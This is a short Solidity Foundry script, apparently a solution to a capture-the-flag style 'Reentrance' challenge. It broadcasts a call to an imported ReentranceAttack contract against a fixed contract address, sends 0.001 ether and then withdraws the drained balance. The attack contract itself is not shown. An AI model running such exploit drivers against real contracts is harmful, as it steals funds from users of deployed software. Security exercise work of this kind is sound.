// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceAttack} from "../src/ReentranceAttack.sol";

contract ReentranceScript is Script {
    function run() public {
        Reentrance reentrance = Reentrance(0x16df183A4B192059C55205c1a50f8598fbA97915);
        ReentranceAttack hacker = ReentranceAttack(0xFcb62D1F0990a5C15af6e0C0861d8d7A9630Df20);

        vm.startBroadcast();
        hacker.attack{value: 1000000000000000}(reentrance);

        hacker.withdraw();
        vm.stopBroadcast();
    }
}